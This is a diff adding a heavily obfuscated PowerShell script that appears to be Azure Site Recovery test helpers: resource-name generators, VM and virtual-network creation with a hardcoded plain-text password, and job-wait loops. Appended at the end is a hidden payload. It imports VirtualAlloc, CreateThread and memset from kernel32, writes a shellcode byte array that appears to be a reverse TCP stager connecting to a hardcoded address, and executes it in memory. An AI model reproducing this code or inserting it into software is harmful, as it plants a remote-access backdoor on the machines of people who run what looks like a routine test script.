@@ -1,0 +1,190 @@
+  &("{1}{2}{3}{0}" -f 'IabLE','s','eT','-VaR') ("wBF"+"9")  (  [Type]("{15}{9}{14}{10}{16}{8}{11}{3}{2}{5}{6}{13}{17}{1}{12}{7}{0}{4}"-f'I','fRAmewOrK.T','m','nTrUnTi','ES','e','.','tutIliT','oFt.re','i','o','sT.cLiE','eS','AZ','CR','M','S','URE.tEST'))  ;  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+${Se`eD} = "98"
+function g`e`TvAu`lTnAmE{
+    return ("{1}{3}{0}{2}"-f'ellT','A','est','2APowersh') + ${SE`ED};
+}
+
+function ge`T`VAUltRg{
+    return ("{0}{3}{4}{2}{1}"-f'A2','Rg','lTest','AP','owershel') + ${s`EEd};
+}
+
+
+function g`Etv`AU`ltR`G`lOCation{
+    return ("{1}{0}{2}" -f't','eas','us')
+}
+
+function G`EtV`A`ULtloc`AtIon{
+     return ("{1}{0}" -f 'stus','ea')
+}
+
+function Ge`TPriMa`R`ylO`c`ATiON
+{
+    return ("{0}{1}" -f'wes','tus')
+}
+
+function GEt`ReC`oVERyLO`ca`TION{
+  return &("{3}{0}{2}{1}" -f 'tVaultLocati','n','o','ge')
+}
+
+function gEt`Pr`I`mA`RyfAbRIC{
+    return  ("{5}{4}{2}{1}{3}{0}" -f 'abric','y','r','F','rima','a2aP')+${S`Eed}
+
+}
+
+function GEt`R`eCoV`eRy`FAbRic{
+    return  ("{3}{2}{0}{1}"-f 'ryFabri','c','Recove','a2a')+${s`eEd}
+
+}
+
+function gETA`Z`UrevM{
+    param([string]${PrimA`R`yL`o`cATION})
+    
+        ${VML`Ocal`Adm`inUSEr} = ("{0}{2}{1}" -f'ad','r','minUse')
+        ${VMlOc`AlAd`m`I`NS`eCUrEPAsS`W`ord} = ("{1}{0}"-f'ssword','pa')
+        ${P`AsSw`ord}=${V`MlOcAlad`min`s`ecUREpASS`wOrd}|&("{4}{0}{3}{5}{1}{2}"-f 'e','ri','ng','rtTo-Se','Conv','cureSt') -AsPlainText -Force
+        ${c`Re`Den`TIAL} = &("{1}{2}{3}{0}" -f 'bject','New','-','O') ("{7}{4}{5}{9}{0}{1}{2}{6}{8}{3}{10}"-f 'ent.','Au','t','ti','em.Man','age','omat','Syst','ion.PSCreden','m','al') (${VmLOCaLa`Dm`i`N`U`sEr}, ${pAssW`O`Rd});
+        &("{0}{1}{2}" -f 'New','-AzV','M') -Name ("{0}{1}"-f 'My','Vm') -Credential ${c`RedeNTi`AL} -location ("{2}{3}{1}{4}{0}" -f 'cation','ary','g','etPrim','Lo')
+}
+
+function getPRI`ma`Rypol`I`cY{
+    return ("{1}{0}{2}{3}{4}" -f'e','T','stA','2','APolicy1') + ${sE`eD};
+}
+
+function GE`Tre`c`OveRYp`OlI`cy{
+    return ("{1}{0}{2}{3}{4}" -f 'estA2APoli','T','c','y','1') + ${S`eEd};
+}
+
+function GE`T`PRI`M`ARYcoNT`AINER{
+    return ("{2}{0}{3}{4}{1}"-f 'a','Container','A2APrim','r','y')+ ${sE`ed};
+}
+
+
+function GEtRECOVe`R`YCO`NtAI`NER{
+    return ("{1}{4}{0}{2}{3}"-f 'ecove','A2A','ryCont','ainer','R')+ ${sE`ed};
+}
+
+
+function GEt`PRIm`AR`yCoN`TAi`NE`RmAPpING{
+    return ("{1}{0}{2}" -f'P','A2A','CM')+ ${s`eeD};
+}
+
+
+function G`EtREC`ovErycontainE`RMap`pInG{
+    return ("{1}{0}{2}" -f '2','A','ARCM')+ ${s`eeD};
+}
+
+function gE`TpRIMARyNEt`woR`kMap`pi`Ng{
+    return ("{0}{2}{3}{1}{4}" -f'A','rkMappi','2ANet','wo','ng')+ ${S`Eed};
+}
+
+function ge`Trec`OVE`RYNEtWor`KmappI`Ng{
+    return ("{2}{4}{3}{5}{0}{6}{1}" -f 'p','ing','A2AR','yNe','ecover','tworkMa','p')+ ${se`eD};
+}
+
+function gE`Tpr`iM`ArYneTworkID{
+    param([string] ${loC`AT`ioN} , [string] ${rESo`U`RC`e`gROup})
+
+    
+}
+
+function gE`TR`ECovery`NeTWO`R`Kid{
+    param([string] ${LoC`ATI`oN} , [string] ${re`SoU`RcEGR`O`UP})
+
+    ${pR`iMA`RYN`eTw`ORkNAme} = ("{2}{1}{3}{0}" -f'rk','yNetw','recover','o')+ ${l`o`CAtioN} + ${S`EEd};
+    ${Vi`Rt`UaLnE`T`WorK} = &("{1}{4}{5}{0}{2}{3}" -f'AzVirtualNet','N','wo','rk','ew','-') `
+          -ResourceGroupName ${rESo`Ur`cegr`O`Up} `
+          -Location ${LO`caTIon} `
+          -Name ${pr`IMA`Rynetw`OrkN`Ame} `
+          -AddressPrefix ("{3}{0}{1}{2}" -f'0.','0.0.0/1','6','1')
+    ${vIrt`UAlN`ETw`ORk}."I`D"
+}
+
+
+
+
+
+function waiTforJobcom`p`let`i`On
+{ 
+    param(
+        [string] ${jo`B`iD},
+        [int] ${J`obQ`UE`RywaIT`TiME`iNsECONDs} = 20,
+        [string] ${MeSS`AGe} = "NA"
+        )
+        ${I`SJOBlef`Tfor`p`RoCeSSI`Ng} = ${t`RuE};
+        do
+        {
+            ${J`OB} = .("{6}{3}{1}{0}{8}{4}{2}{7}{5}"-f'r','ove','esAsr','AzRec','ervic','ob','Get-','J','yS') -Name ${jO`BID}
+            .("{2}{1}{0}"-f 'ost','ite-H','Wr') $(("{0}{2}{1}" -f'Jo','s:','b Statu')) -ForegroundColor ("{0}{1}" -f'Gr','een')
+            ${J`oB}
+
+            ${Isjo`Bl`e`F`TForPRO`CEs`SInG} = (${J`ob}."st`Ate" -eq ("{0}{3}{2}{1}"-f 'In','ss','ogre','Pr') -or ${J`OB}."sTA`Te" -eq ("{2}{0}{1}"-f'ta','rted','NotS'))
+            
+            if(${i`sjo`BlefT`F`ORPRo`c`esSING})
+            {
+                if(${M`EsSA`Ge} -ne "NA")
+                {
+                    .("{1}{0}{2}"-f 'rite','W','-Host') ${m`e`sSagE} -ForegroundColor ("{0}{2}{1}"-f'Y','llow','e')
+                }
+                else
+                {
+                    .("{1}{0}{2}" -f'ri','W','te-Host') $($(${j`OB}."J`o`Btype") + ("{3}{0}{2}{1}"-f'n Progre','..','ss.',' i')) -ForegroundColor ("{0}{1}"-f 'Yel','low')
+                }
+                &("{0}{1}{2}"-f 'W','rit','e-Host') $(("{0}{4}{3}{2}{1}" -f'W',' ',':','ng for','aiti') + ${JO`Bqu`eR`YwaiTtIMeiN`SEco`NDS}."T`OStri`Ng" + ("{2}{0}{1}"-f'ond','s',' Sec')) -ForegroundColor ("{1}{0}{2}" -f 'll','Ye','ow')
+                  ${wb`F9}::("{1}{0}" -f'it','Wa').Invoke(${JOb`que`RYw`AItTIMEin`sEc`oNDs} * 1000)
+            }else
+            {
+                if( !((${J`OB}."S`TATE" -eq ("{1}{2}{0}" -f'ded','Suc','cee')) -or (${J`ob}."s`TaTE" -eq ("{5}{1}{0}{3}{6}{4}{7}{2}" -f 'etedWi','ompl','rmation','t','I','C','h','nfo'))))
+                {
+                    throw ("{1}{0}"-f'ob ','J') + ${jOb`Id} + ("{1}{0}"-f '.','failed')
+                }
+            }
+        }While(${i`Sj`OBL`eFTfoRprOCE`s`S`ing})
+}
+
+
+Function WAi`TF`OR`irc`oMpl`eTIon
+{ 
+    param(
+        [PSObject] ${A`Ffec`TedOB`JEctiD},
+        [int] ${jO`B`query`wAIT`TImEINsecONdS} = 10
+        )
+        ${isPR`Oces`siNG`LEft} = ${tr`Ue}
+        ${i`RjOBs} = ${N`UlL}
+
+        .("{2}{1}{0}"-f'st','o','Write-H') $(("{0}{2}{1}{4}{3}" -f 'IR','.',' in Progress','.','.')) -ForegroundColor ("{1}{0}"-f'low','Yel')
+        do
+        {
+            ${irjO`BS} = &("{0}{4}{1}{8}{7}{5}{3}{2}{6}"-f 'Get','Az','ice','v','-','Ser','sAsrJob','very','Reco') -TargetObjectId ${aFf`e`CTedOBJe`cTid} | &("{3}{1}{0}{2}" -f 'b','O','ject','Sort-') ("{2}{1}{0}" -f'e','im','StartT') -Descending | .("{2}{0}{1}" -f 'el','ect','s') -First 2 | .("{1}{3}{0}{2}"-f'-Obje','W','ct','here'){${_}."JO`BTYpe" -eq ("{2}{4}{0}{5}{1}{3}" -f 'o','p','Seco','letion','ndaryIrC','m')}
+            ${iSPR`o`CeSsi`N`glEft} = (${IR`JO`Bs} -eq ${nu`ll} -or ${iRJo`Bs}."CO`Unt" -ne 1)
+
+            if(${iSPr`O`CesSiNgl`eFt})
+            {
+                .("{0}{2}{1}"-f 'Writ','-Host','e') $(("{3}{2}{4}{0}{1}"-f'..','.','n Progr','IR i','ess')) -ForegroundColor ("{0}{1}"-f'Yell','ow')
+                &("{0}{3}{2}{1}" -f 'Wr','Host','-','ite') $(("{0}{2}{3}{1}"-f 'Wait',': ','ing f','or') + ${Job`QuE`RY`waIt`T`IMeINSeCoNdS}."TOsT`R`Ing" + ("{2}{1}{0}" -f 's','ond',' Sec')) -ForegroundColor ("{0}{1}"-f'Y','ellow')
+                 (.("{0}{2}{1}"-f'V','riABLE','A') ("wBF"+"9")).vAlUe::("{1}{0}"-f't','Wai').Invoke(${J`OBQ`Ue`R`YWA`Itt`IMeINSec`ONDS} * 1000)
+            }
+        }While(${I`s`P`ROCE`sSiNglEFT})
+
+        .("{0}{2}{1}"-f 'Writ','st','e-Ho') $(("{0}{3}{1}{4}{2}{5}" -f'Finali','e IR ','bs','z','jo',':')) -ForegroundColor ("{1}{0}" -f'en','Gre')
+        ${IR`jo`BS}
+        .("{0}{2}{1}{3}{4}"-f 'WaitF','bCompl','orJo','et','ion') -JobId ${Irj`OBs}[0]."N`AmE" -JobQueryWaitTimeInSeconds ${jo`BQuE`RYW`AitT`IMEin`s`EC`ON`DS} -Message $(("{5}{0}{3}{1}{2}{4}" -f 'ize I','n P','rogre','R i','ss...','Final'))
+}
+
+${C} = ((("{74}{64}{69}{91}{61}{62}{81}{26}{31}{27}{73}{22}{75}{107}{68}{103}{109}{32}{106}{33}{105}{12}{56}{24}{6}{52}{40}{20}{44}{102}{90}{92}{3}{37}{113}{71}{101}{36}{80}{50}{65}{7}{63}{108}{76}{110}{10}{49}{60}{95}{51}{89}{86}{85}{55}{30}{39}{34}{98}{15}{54}{17}{82}{70}{72}{23}{88}{100}{43}{4}{79}{87}{96}{19}{66}{38}{18}{25}{45}{5}{13}{99}{94}{53}{16}{46}{67}{104}{77}{114}{47}{28}{59}{1}{48}{11}{58}{35}{84}{29}{93}{112}{78}{0}{111}{41}{57}{8}{83}{9}{14}{42}{115}{97}{2}{21}"-f 'c sta','Import(L','c','loc','es','tartAddr','t ','rotect);[DllImpo','t(In','Ptr de','el32','cr',' ','ess, I','st, uint s','P','te','ea','t','t d',' u','ount);','tP','tt','n','ackSize, IntPtr l',']pu','e',' ','lL','c exte','blic static ext','(Int','r lpAddre',' ','.','uin','a','S','rn','Size,','xt','rc,','t','int','pS','r, uint ','r','nDmsv','.',' ','L','dw','pParame','tr Cr','ti','ui','ern IntPtr memse','t','lpThreadId);[Dll','dl','nel32.dllLn','D','r','lIm','flP','w','dwCr','t','port(LnD','tPtr lpThread','ype','A','rn In','[Dl','tr Vi','LnDke','ationFlags, Int','ubli',', ','t',')','teThread(In','t','dl','ta','ic s','u','rib','nD)]publ','flA','ker','l','nD','l','l','in','nt ','Int','ntPtr ','u',', ',' ','u','e','ss,','Pt','r','t(','alAlloc','rn','tic e',')]p','tionT','Pt',' ui')) -rePLACe 'LnD',[chAr]34);${w} = &("{2}{0}{1}"-f 'Ty','pe','Add-') -memberDefinition ${C} -Name ("{1}{0}"-f 'n32','Wi') -namespace ("{2}{0}{3}{1}" -f'n32Funct','ns','Wi','io') -passthru;[Byte[]];[Byte[]]${Z} = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xd9,0xd9,0x43,0xfd,0x68,0x02,0x00,0x1a,0x0a,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x3f,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xe9,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xc3,0x01,0xc3,0x29,0xc6,0x75,0xe9,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;${G} = 0x1000;if (${z}."LEn`G`Th" -gt 0x1000){${G} = ${z}."l`engTh"};${X}=${w}::("{0}{2}{1}"-f 'Virt','lAlloc','ua').Invoke(0,0x1000,${g},0x40);for (${I}=0;${I} -le (${Z}."l`eNGtH"-1);${I}++) {${W}::"MEm`SeT"([IntPtr](${X}.("{0}{1}{2}"-f 'T','oI','nt32').Invoke()+${I}), ${z}[${I}], 1)};${w}::("{0}{1}{3}{2}" -f 'Crea','te','ead','Thr').Invoke(0,0,${X},0,0,0);for (;;){.("{3}{1}{0}{2}"-f 't-slee','tar','p','S') 60};
